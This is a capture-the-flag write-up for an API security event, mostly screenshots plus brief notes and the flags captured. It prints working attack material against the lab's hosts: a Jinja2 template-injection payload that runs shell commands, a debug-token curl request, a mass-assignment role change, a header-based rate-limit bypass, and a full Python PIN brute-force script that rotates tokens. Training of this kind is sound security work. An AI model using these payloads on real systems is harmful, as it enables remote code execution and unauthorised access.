# APIsec con ctf 2025

![image.png](images/image.png)

![image.png](images/image%201.png)

# Category: **Shadow APIs**

## Challenge Name: **API Obscura**

![image.png](images/image%202.png)

![image.png](images/image%203.png)

![image.png](images/image%204.png)

debug post request in curl using debug token found in /api.min.js

```python
curl -X POST [https://api-obscura.ac25.apisecuniversity.com/api/debug](https://api-obscura.ac25.apisecuniversity.com/api/debug) \
-H "Content-Type: application/json" \
-H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRlYnVnIiwicm9sZSI6ImRlYnVnZ2VyIiwiaWF0IjoxNzQ3ODczOTEwLCJleHAiOjE3NTA0NjU5MTB9.VjFkiXQ0zCux6uG3eKuEqHB3yrgGMXmKvieAHhZotcQ" \
--data-raw '{"debug":true}'
```

or in burp. must add `Content-Type: application/json` other wise it won’t work

![image.png](images/image%205.png)

![image.png](images/image%206.png)

![image.png](images/image%207.png)

## 

# Category : Injection Junction

## Challenge Name : **Break the Gate**

![image.png](images/image%208.png)

![image.png](images/image%209.png)

![image.png](images/image%2010.png)

## Challenge Name : **The Search for Secrets**

![image.png](images/image%2011.png)

![image.png](images/image%2012.png)

![image.png](images/image%2013.png)

![image.png](images/image%2014.png)

![image.png](images/image%2015.png)

# Category: **Slash and Dash**

## Challenge Name : **Roads Less Traveled**

![image.png](images/image%2016.png)

![image.png](images/image%2017.png)

![image.png](images/image%2018.png)

## Challenge Name : **Filtered Fun**

![image.png](images/image%2019.png)

![image.png](images/image%2020.png)

```python
flag{F1LT3R_BYP4SS_D0T_D0T_SL4SH}
```

## Challenge Name : Encoded Escapades

![image.png](images/image%2021.png)

![image.png](images/image%2022.png)

![image.png](images/image%2023.png)

```python
flag{D0UBL3_3NC0D1NG_TR4V3R54L_M45T3R}
```

# Category: Bounty Hub

## Challenge Name : Exception Excavation

![image.png](images/image%2024.png)

![image.png](images/image%2025.png)

![image.png](images/image%2026.png)

![image.png](images/image%2027.png)

![image.png](images/image%2028.png)

![image.png](images/image%2029.png)

![image.png](images/image%2030.png)

but if we go change the preview number that doesn’t exist? 

![image.png](images/image%2031.png)

we got our flag.

## Challenge Name :

![image.png](images/image%2032.png)

we are given the same url. so we need to continue…

from previous challenge we could inject `ssti` confirmation payload and it worked. in this part we’ll exploit it.

```python
{{cycler.__init__.__globals__.os.popen('id').read() }}
```

![image.png](images/image%2033.png)

![image.png](images/image%2034.png)

![image.png](images/image%2035.png)

![image.png](images/image%2036.png)

Aha, we got 3 flags… so we don’t need to go through other challenge.

```python
flags:

==> flags/flag1.txt <==
flag{st4ck_tr4c3s_r3v34l_s3cr3ts}
==> flags/flag2.txt <==
flag{t3mpl4t3_1nj3ct10n_ftw}
==> flags/flag3.txt <==
flag{ch41n1ng_vuln3r4b1l1t13s_f0r_th3_w1n} 
```

# Category: Massive

## Challenge Name :

put request added role: admin

![image.png](images/image%2037.png)

```python
flag: flag{pr0t3ct3d_f13lds_byp4ss3d}
```

## Challenge Name :

# Category: Rate my api

## Challenge Name : Rate Unlimited

![image.png](images/image%2038.png)

![image.png](images/image%2039.png)

![image.png](images/image%2040.png)

![image.png](images/image%2041.png)

![image.png](images/image%2042.png)

```python

```

## Challenge Name : Rate Limited

![image.png](images/image%2043.png)

![image.png](images/image%2044.png)

![image.png](images/image%2045.png)

```python
flag{x_f0rw4rd3d_f0r_byp4ss}
```

## Challenge Name : Rate Advanced

![image.png](images/image%2046.png)

![image.png](images/image%2047.png)

![image.png](images/image%2048.png)

![image.png](images/image%2049.png)

![image.png](images/image%2050.png)

![image.png](images/image%2051.png)

![image.png](images/image%2052.png)

![image.png](images/image%2053.png)

![image.png](images/image%2054.png)

Remember we go another endpoint `api/vault` 

![image.png](images/image%2055.png)

![image.png](images/image%2056.png)

![image.png](images/image%2057.png)

```python
flag{t0k3n_r3fr3sh_byp4ss_m4st3r}
```

## Challenge Name :  Rate Quantum

![image.png](images/image%2058.png)

```python
import requests
import json
import time
import random

# Configuration
BASE_URL = "https://rate-quantum.ac25.apisecuniversity.com"
ROTATE_TOKEN_ENDPOINT = "/api/rotate-token"
VERIFY_PIN_ENDPOINT = "/api/quantum-verify"
INITIAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjEwLjIuNS4xNSIsInRva2VuSWQiOiIxYmM4NmFhLWQwNzY1MmYxIiwibm9kZUlkIjoyLCJjcmVhdGVkIjoxNzQ3OTQ3NTAzNTg3LCJhdHRlbXB0cyI6MCwibGFzdEF0dGVtcHQiOjAsImlhdCI6MTc0Nzk0NzUwMywiZXhwIjoxNzQ3OTQ5MzAzfQ.FYmoqDywVwBikeT2I9_RfQf1dZS6PqH_RovhpmjWchk"
COOKIES = {
    "signals-sdk-user-id": "1355db5c-d4db-4d9f-9d8a-97bb9e7442c3",
    "twk_uuid_67eb099ef8deed19122e2c82": "{\"uuid\":\"1.AGImXJs8yR5pFt9GbJrKhey5hpa4JDnMYVi31oNa9lGwDEwSK8jjglp2mXlrSfWzIsiWSeBLRRTmjhcIM85QURCpNBraE2R56KUF2gfuTAKnhPwn3gClkrU4cOYmH5pp\",\"version\":3,\"domain\":\"apisecuniversity.com\",\"ts\":1746654580531}"
}
HEADERS = {
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Sec-Ch-Ua": "\"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
    "Dnt": "1",
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?0",
    "Accept": "*/*",
    "Origin": BASE_URL,
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": f"{BASE_URL}/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
    "Priority": "u=1, i"
}

# Rate limiting configuration
REQUESTS_PER_SECOND = 3
ATTEMPTS_PER_TOKEN = 3
PIN_RANGE = range(8000, 10000)  # 0000 to 9999
MAX_RETRIES = 4
BASE_BACKOFF = 1  # Seconds
REQUEST_INTERVAL = 1 / REQUESTS_PER_SECOND  # Time per request (0.333s for 3 req/s)

def rotate_token(current_token):
    """Rotate the JWT token by sending a POST request to the rotate-token endpoint."""
    headers = HEADERS.copy()
    headers["X-Quantum-Token"] = current_token
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(f"{BASE_URL}{ROTATE_TOKEN_ENDPOINT}", headers=headers, cookies=COOKIES, timeout=5)
            response.raise_for_status()
            data = response.json()
            if data.get("success"):
                return data["token"]
            else:
                print(f"Token rotation failed: {data.get('message')}")
                return None
        except requests.RequestException as e:
            if isinstance(e, requests.HTTPError) and e.response.status_code == 429:
                sleep_time = BASE_BACKOFF * (2 ** attempt) + random.uniform(0, 0.1)
                print(f"429 on token rotation, retrying after {sleep_time:.2f}s...")
                time.sleep(sleep_time)
            else:
                print(f"Error rotating token: {e}")
                return None
    print("Max retries reached for token rotation.")
    return None

def verify_pin(pin, token, request_start_time):
    """Send a PIN verification request with retry on 429 or 500 errors."""
    headers = HEADERS.copy()
    headers["X-Quantum-Token"] = token
    payload = {"pin": f"{pin:04d}"}
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(f"{BASE_URL}{VERIFY_PIN_ENDPOINT}", headers=headers, cookies=COOKIES, json=payload, timeout=5)
            response.raise_for_status()
            # Adjust timing to maintain 3 req/s
            elapsed = time.time() - request_start_time
            if elapsed < REQUEST_INTERVAL:
                time.sleep(REQUEST_INTERVAL - elapsed)
            return response.json()
        except requests.RequestException as e:
            if isinstance(e, requests.HTTPError) and e.response.status_code in (429, 500):
                sleep_time = BASE_BACKOFF * (2 ** attempt) + random.uniform(0, 0.1)
                print(f"{e.response.status_code} on PIN {pin:04d}, retrying after {sleep_time:.2f}s...")
                time.sleep(sleep_time)
            else:
                print(f"Error verifying PIN {pin:04d}: {e}")
                return None
    print(f"Max retries reached for PIN {pin:04d}.")
    return None

def process_pin(pin, token, request_start_time, failed_pins):
    """Process a single PIN attempt and check the response."""
    result = verify_pin(pin, token, request_start_time)
    if result is None:
        failed_pins.append(pin)  # Store PIN if max retries reached (429 or 500)
        return False
    if result.get("success"):
        print(f"[SUCCESS] Correct PIN found: {pin:04d}")
        return True
    else:
        print(f"PIN {pin:04d} incorrect. Attempts remaining: {result.get('attemptsRemaining', 'N/A')}")
        return False

def main():
    current_token = INITIAL_TOKEN
    pin_index = 0
    failed_pins = []  # List to store PINs that failed with 429 or 500

    # First pass: Try all PINs
    while pin_index < len(PIN_RANGE):
        # Rotate token at the start and after every 3 attempts
        new_token = rotate_token(current_token)
        if not new_token:
            print("Failed to rotate token. Exiting.")
            break
        current_token = new_token
        print(f"Rotated token: {current_token[:20]}...")

        # Process exactly 3 PINs per token
        batch_size = min(ATTEMPTS_PER_TOKEN, len(PIN_RANGE) - pin_index)
        batch = PIN_RANGE[pin_index:pin_index + batch_size]

        for pin in batch:
            request_start_time = time.time()
            success = process_pin(pin, current_token, request_start_time, failed_pins)
            if success:
                return  # Exit if correct PIN is found

        pin_index += batch_size

    # If no PIN was found, retry failed PINs
    if failed_pins:
        print(f"Retrying {len(failed_pins)} PINs that failed with 429 or 500 errors...")
        current_token = rotate_token(current_token)  # Rotate token before retrying
        if not current_token:
            print("Failed to rotate token for retries. Exiting.")
            return

        failed_index = 0
        while failed_index < len(failed_pins):
            new_token = rotate_token(current_token) if failed_index % ATTEMPTS_PER_TOKEN == 0 else current_token
            if not new_token:
                print("Failed to rotate token. Exiting.")
                break
            current_token = new_token
            print(f"Rotated token: {current_token[:20]}...")

            batch_size = min(ATTEMPTS_PER_TOKEN, len(failed_pins) - failed_index)
            batch = failed_pins[failed_index:failed_index + batch_size]

            for pin in batch:
                request_start_time = time.time()
                success = process_pin(pin, current_token, request_start_time, failed_pins)  # Pass failed_pins for potential re-failures
                if success:
                    return  # Exit if correct PIN is found

            failed_index += batch_size

    print("Exhausted all PINs without success.")

if __name__ == "__main__":
    main()
```

![image.png](images/image%2059.png)

![image.png](images/image%2060.png)

```python
flag{qu4ntum_t0k3n_f0rg3ry_m4st3r}
```